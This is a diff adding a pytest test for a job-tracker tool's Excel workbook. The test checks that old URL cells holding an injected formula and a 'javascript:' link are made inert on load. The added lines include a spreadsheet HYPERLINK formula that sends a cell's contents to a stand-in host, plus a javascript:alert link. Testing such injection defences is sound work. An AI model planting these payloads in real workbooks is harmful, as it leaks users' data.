@@ -414,3 +414,25 @@ def test_board_url_is_text_and_only_http_links(tmp_path: Path):
     assert cells["u1"].data_type == "s" and cells["u1"].value == evil and cells["u1"].hyperlink is None
     assert cells["u2"].hyperlink is None
     assert cells["u3"].hyperlink.target == "https://boards.greenhouse.io/acme/jobs/1"
+
+
+def test_legacy_formula_url_cells_are_neutralised_on_open(tmp_path: Path):
+    """A workbook written before URL cells were text-safe: formula URL + javascript: link get fixed on load."""
+    p = tmp_path / "JobTracker.xlsx"
+    tr = Tracker(path=p)
+    tr.upsert_job({"job_id": "l1", "company": "Acme"})
+    tr.upsert_job({"job_id": "l2", "company": "Acme", "url": "https://ok.example/1"})
+    wb = load_workbook(p)
+    ws = wb["Jobs"]
+    hdr = {c.value: c.column for c in ws[1]}
+    evil = '=HYPERLINK("http://x.example/?"&A1,"click")'
+    ws.cell(row=2, column=hdr["URL"]).value = evil            # openpyxl stores it as a formula
+    ws.cell(row=2, column=hdr["URL"]).hyperlink = "javascript:alert(1)"
+    wb.save(p)
+    assert load_workbook(p)["Jobs"].cell(row=2, column=hdr["URL"]).data_type == "f"
+
+    tr.set_status("l2", "queued")  # any mutation opens + saves the workbook
+    ws = load_workbook(p)["Jobs"]
+    c1, c2 = ws.cell(row=2, column=hdr["URL"]), ws.cell(row=3, column=hdr["URL"])
+    assert c1.data_type == "s" and c1.value == evil and c1.hyperlink is None
+    assert c2.hyperlink.target == "https://ok.example/1"
